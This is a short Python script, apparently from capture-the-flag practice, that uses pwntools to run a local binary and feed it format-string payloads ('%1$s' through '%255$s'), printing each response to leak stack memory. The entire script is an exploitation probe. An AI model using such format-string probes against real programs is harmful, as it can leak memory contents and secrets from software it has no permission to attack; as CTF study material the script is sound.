import pwn
elf=pwn.ELF("./a.out")
for i in range(1,256):
    payload=b"".join([
        b"%"+str(i).encode("utf-8")+b"$s",
    ])
    p=elf.process();
    p.sendline(payload)
    response=p.recvall().decode('utf-8')
    print(response)
